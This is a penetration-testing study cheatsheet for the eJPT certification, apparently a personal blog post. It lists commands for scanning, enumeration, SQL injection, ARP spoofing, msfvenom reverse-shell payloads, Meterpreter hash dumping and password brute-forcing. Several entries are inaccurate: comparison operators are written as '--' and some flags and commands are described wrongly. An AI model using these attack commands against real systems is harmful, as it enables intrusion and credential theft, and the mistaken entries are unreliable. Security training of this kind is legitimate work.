---
title: eJPT Cheatsheet
date: 2022-07-01 12:30:00 +/-TTTT
categories: [Certifications, Cheatsheet]
tags: [certifications, cheatsheet, ejpt]
toc: true
author:
  name: v3r4x
---

![](/assets/posts/20220701/obfuscated_cert.png)

## Overview

Welcome to my cheatsheet notes for the eLearnSecurity Junior Penetration Tester (eJPT) certification. While I recommend you use these notes, you are also encouraged to make your own as you go through the [INE Penetration Testing Student (PTS)](https://my.ine.com/CyberSecurity/learning-paths/a223968e-3a74-45ed-884d-2d16760b8bbd/penetration-testing-student) course - this will greatly improve your understanding of the concepts and practices taught throughout the course.  For effective notetaking, I would highly recommend [Obsidian](https://obsidian.md/).  I have only started to use this recently and it has completely change the way I write notes and dramatically increased my productivity.

Furthermore, I would also encourage you to seek out other content creators to improve your skillset, some of which are linked below.  Please note, this is **not necessary** to pass the eJPT exam or to study the course, these are purely recommendations for future study.

- [John Hammond](https://www.youtube.com/c/JohnHammond010) - incredibly in-depth CTF tutorials, malware analysis, and interviews with infosec professionals, etc.
- [TheCyberMentor](https://www.youtube.com/c/TheCyberMentor) - outstanding course material for beginners (linux fundamentals, penetration testing, OSINT, privilege escalation, etc.).
- [David Bombal](https://www.youtube.com/c/DavidBombal) - insightful interviews with infosec professionals and networking tutorials.
- [NetworkChuck](https://www.youtube.com/c/NetworkChuck) - great beginner tutorials on everything from Python to networking, plus some portfolio projects.
- [ippsec](https://www.youtube.com/c/ippsec) - mainly video writeups on HackTheBox machines but with incredibly high-quality explanations.
- [CryptoCat](https://www.youtube.com/c/CryptoCat23) - vast array of video write-ups for CTF challenges suitable for all skill levels.

Before continuing, it is worth mentioning that my notes **do not** contain details about the labs or the exam - for obvious reasons.  In addition, INE update their courses fairly frequently so some of the information may be outdated after this is published.  I will do my utmost to update them, but I am not planning on a complete overhaul should the course be changed significantly.  Finally, these notes are also available on my [Github](https://github.com/0xv3r4x/ejpt_cheatsheet) if you want to create your own copy.

I am very much a "*quality over quantity*" person, so the content I produce often takes a long time to create.  If you like this or found it useful, buy me a coffee:

<a href="https://www.buymeacoffee.com/v3r4x" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important; width: auto !important;"></a>

If you want to keep up-to-date on what I get up to, follow me here:

- [Twitter](https://twitter.com/0xV3R4X)
- [GitHub](https://github.com/0xv3r4x)

I hope you put these notes to good use!

## eJPT Notes

The layout of this document follows a logical order from enumeration to exploitation.  Steps should be repeated where necessary.

## Common Ports

### TCP

| **Port** | **Service** | 
| ---- | ------- |
| 21 | FTP |
| 22 | SSH |
| 23 | Telnet |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP |
| 110 | POP3 |
| 139 + 445 | SMB |
| 143 | IMAP |
| 443 | HTTPS |

### UDP

| **Port** | **Service** | 
| ---- | ------- |
| 53 | DNS |
| 67 | DHCP |
| 68 | DHCP |
| 69 | TFTP |
| 161 | SNMP |

## Other Useful Ports

| **Port** | **Service** | 
| ---- | ------- |
| 1433 | MS SQL Server |
| 3389 | RDP |
| 3306 | MySQL |

## Scanning and Enumeration

### Establish your IP with `ifconfig`

Use `ifconfig` to establish your IP.  For example:

```console
$ ifconfig
tap0: flags-4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.193.70  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::c8f:29ff:feb4:5219  prefixlen 64  scopeid 0x20<link>
        ether 0e:8f:29:b4:52:19  txqueuelen 1000  (Ethernet)
        RX packets 14  bytes 1541 (1.5 KiB)
        RX errors 0  dropped 4  overruns 0  frame 0
        TX packets 9  bytes 754 (754.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### Ping Sweeps using `fping`

```console
$ fping -a -g IPRANGE
```

- `-a` only shows **alive hosts**
- `-g` performs a **ping sweep** instead of a normal ping

For example:

```console
$ fping -a -g 192.168.32.0/24

OR

$ fping -a -g 192.168.82.0 192.168.82.255
```

You can also suppress warnings by directing the process standard error to `/dev/null`:

```console
$ fping -a -g 192.168.32.0/24 2>/dev/null

OR

$ fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null
```

### Combining `fping` with `nmap`

Using `fping` to discover hosts and directing it to an output file `ips.txt`:

```console
$ fping -a -g IPRANGE 2>/dev/null > ips.txt
```

Then, use `nmap` to conduct a ping scan:

```console
$ nmap -sn -iL ips.txt
```

### Host Discovery with `nmap`

Perform a ping scan using `-sn`:

```console
$ nmap -sn IPRANGE
```

For example:

```console
$ nmap -sn 200.200.0.0/16
$ nmap -sn 200.200.123.1-12
$ nmap -sn 172.16.12.*
$ nmap -sn 200.200.12-13.*
```

You can also load files from an input list using `-iL`:

```console
$ nmap -sn -iL FILENAME.EXTENSION
```

For example, a file named `hostlist.txt` contains the following:

```console
192.168.32.0/24
172.16.12.*
200.200.123.1-12
```

The `nmap` command would then become:

```console
$ nmap -sn -iL hostlist.txt
```

### Enumeration with `nmap`

For each host on a network, you can run the following to enumerate it:

```console
$ nmap -p- -Pn -sC -sV <IP address>
```

- `-p-` scans all ports
- `-Pn` assumes all ports are open
- `-sC` performs a **script scan**
- `-sV` performs a **version detection scan**

For example:

```console
# Full port enumeration outputted to file
$ nmap -p- -Pn -sC -sV 192.168.1.24 -oN initial_scan

# First 1000 ports
$ nmap -p 1-1000 192.168.1.24

# Service detection scan on /24 network
$ nmap -sV 10.11.12.0/24

# TCP connect scan on two targets
$ nmap -sT 192.168.12.33,34

# Full scan (all ports, syn/script/version scan)
$ nmap -Pn -T4 --open -sS -sC -sV --min-rate-1000 --max-retries-3 -p- -oN output_file 10.10.10.2
```

### Shares Enumeration

#### Using `smbclient`

List shares:

```console
$ smbclient -L //<IP ADDRESS>/ -N
```

Mount share:

```console
$ smbclient //<IP ADDRESS>/<SHARE>
```

#### Using `enum4linux`

```console
$ enum4linux -a <IP ADDRESS>
```

#### Using `nmblookup`

```console
$ nmblookup -A <IP ADDRESS>
```

#### Using `nmap`

```console
$ nmap --script smb-vuln* -p <PORT> <IP ADDRESS>
```

### Banner Grabbing

#### Using `netcat`

```console
$ nc -nv <IP Address> <Port>
```

For example:

```console
$ nc -nv 192.168.1.24 80
```

#### Using `openssl` (HTTPS)

```console
$ openssl s_client -connect <IP ADDRESS>:443
```

### Common Wireshark Filters

| Description | Syntax | Example |
| ----------- | ------ | ------- |
| Filter by IP | `ip.add -- IP ADDRESS` | `ip.add -- 192.168.1.28` |
| Filter by Destination IP | `ip.dest -- IP ADDRESS` | `ip.add -- 192.168.1.28` |
| Filter by Source IP | `ip.src -- IP ADDRESS` | `ip.add -- 192.168.1.72` |
| Filter by Port | `tcp.port -- PORT` | `tcp.port -- 80` |
| Filter by IP Address and Port | `ip.addr -- IP ADDRESS and tcp.port -- PORT` | `ip.addr -- 10.9.0.1 and tcp.port -- 80` | 
| Filter by Request (HTTP/HTTPS) | `request.method -- METHOD` | `request.method -- "POST"` or `request.method -- "GET"`

### Web Enumeration

#### Directory Fuzzing with `gobuster`

```console
$ gobuster dir -u <URL> -w <WORDLIST>
```

For example:

```console
# Directory scan against one target using medium wordlist
$ gobuster dir -u http://192.168.1.32 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Directory scan against specific directory using custom wordlist
$ gobuster dir -u http://192.168.5.24/confidential -w custom_wordlist.txt

# Directory scan with authentication
$ gobuster dir -u http://192.168.4.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U admin
```

#### Directory Fuzzing with `dirb`

```console
$ dirb <URL> <WORDLIST>
```

For example:

```console
# Directory scan against one target
$ dirb http://192.168.1.72/ /usr/share/wordlists/dirb/common.txt

# Directory scan with authentication
$ dirb http://192.168.1.85/ -u "username:password" /usr/share/wordlists/dirb/common.txt
```

#### Enumeration with `nikto`

```console
$ nikto -h URL
```

For example:

```console
$ nikto -h http://192.168.1.10/
```

#### `whois`

```console
$ whois <URL>
```

## Routing and Pivoting

### Clear Routing Table

To completely clear the routing table, run the following:

```console
$ route -n
```

Use this when setting up a route to make the destination and gateway more clear

### Show Routing Table

On Windows (and Linux), you can use `arp -a`:

```console
$ arp -a
```

And, on Linux, you can use `ip route`:

```console
$ ip route
```

### Setting up a Route with `iproute`

```console
$ ip route add <Network To Access> via <Gateway Address>
```

For example:

```console
$ ip route add 192.168.1.0/24 via 10.10.22.1
```

This adds a route to the `192.168.1.0/24` network via the `10.10.22.1` router.

## Exploitation

### Web Exploitation

#### Manual SQL Injection (SQLi)

| Description | Injection |
| ----------- | --------- |
| Basic union | `xx' UNION SELECT null; -- -` |
| Basic bypass | `' or 1-1; -- -` |

#### Automated Exploitation with `sqlmap`

```console
$ sqlmap -u <URL> -p <PARAMETER> [options] 
```

For example:

```console
# Display all tables in the database
$ sqlmap -u http://10.10.0.1/index.php?id-47 --tables

# Enumerate the id parameter using the union technique
$ sqlmap -u 'http://192.168.1.72/index.php?id-10' -p id --technique-U

# Dump database contents
$ sqlmap -u 'http://192.162.5.51/index.php?id-203' --dump

# Prompt for interactive OS shell
$ sqlmap -u 'http://192.168.1.17/index.php?id-1' -os-shell
```

#### Cross-Site Scripting (XSS)

Test inputs against XSS using:

```js
<script>alert("XSS")</script>
```

### Host Exploitation

#### `arpspoof`

First, tell your machine to forward packets to the destination host

```console
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```

Then, run `arpspoof`:

```console
$ arpspoof -i <INTERFACE> -t <TARGET> -r <HOST>
```

For example:

```console
$ arpspoof -i tap0 -t 10.10.5.1 -r 10.10.5.7
```

#### Basic Metasploit Usage

Launch Metasploit by running:

```console
$ msfconsole
```

Basic commands:

```console
# Search for exploit
msf5 > search apache

# Use exploit (by number)
msf5 > use 1

# Use exploit (by name)
msf5 > use exploit/multi/handler

# Set parameter
msf5 > set payload windows/x64/meterpreter/reverse_tcp

# Show parameters and other options
msf5 > show options
```

For example, to configure a listener for a reverse shell:

```console
$ msfconsole
$ use exploit/multi/handler
$ set payload <REVERSE SHELL PAYLOAD>
$ set LHOST <LISTENER IP>
$ set LPORT <LISTENER PORT>
$ exploit
```

#### Generate Payload Using `msfvenom`

Standard PHP reverse shell:

```console
$ msfvenom -p php/reverse_php LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -o <OUTPUT FILE NAME>
```

Windows reverse shell:

```console
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f dll > shell.dll
```

Linux reverse shell:

```console
$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=<LISTENER IP> LPORT=<LISTENER PORT> -f elf > shell.elf
```

#### Meterpreter Shell Commands

```console
# background current session
meterpreter > background

# list current open sessions
meterpreter > session -l

# open session
meterpreter > session -i <SESSION NUMBER>

# privilege escalation (Windows)
meterpreter > getsystem

# list system information
meterpreter > sysinfo/route/getuid

# dump Windows hashes
meterpreter > hashdump

# upload file to system
meterpreter > download <FILE NAME> /path/to/directory
```

#### Listener with `netcat`

```console
$ nc -nvlp PORT
```

- `n`: IP addresses only (no DNS)
- `v`: verbose mode (`-vv` for very verbose)
- `l`: listen for incoming connections
- `p`: local port to listen on

For example:

```console
$ nc -nvlp 4444
```

#### Stabilise a Shell

Spawn an interactive terminal via Python:

```console
# First check if the system has Python
$ which python
/usr/bin/python

# Then, spawn a Python shell using pty
$ python -c "import pty; pty.spawn('/bin/bash')"

# Finally, export XTERM (allows you to clear terminal)
$ export TERM=xterm
```

**NOTE**: this works the same with `python3`.

## Bruteforcing

### `hydra`

```console
$ hydra -L <LIST OF USERNAMES> -P <LIST OF PASSWORDS> <TARGET> <SERVICE> -s <PORT>

OR

$ hydra -l <USERNAME> -P <LIST OF PASSWORDS> -t <TARGET> <SERVICE> -s <PORT>
```

```console
# Bruteforce SSH
$ hydra -L users.txt -P pass.txt 10.10.10.2 ssh -s 22 
$ hydra -L users.txt -P pass.txt ssh://10.10.10.2

# Bruteforce FTP
$ hydra -l admin -P passwords.txt 192.168.1.4 ftp -s 21
$ hydra -l admin -P passwords.txt ftp://192.168.1.4
```

### John The Ripper (`john`)

First, prepare a file for `john` to crack:

```console
$ unshadow passwd shadow > hash
```

Crack the passwords:

```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## Other cheatsheets:

- Hydra: https://github.com/frizb/Hydra-Cheatsheet
- GTFOBins: https://gtfobins.github.io/
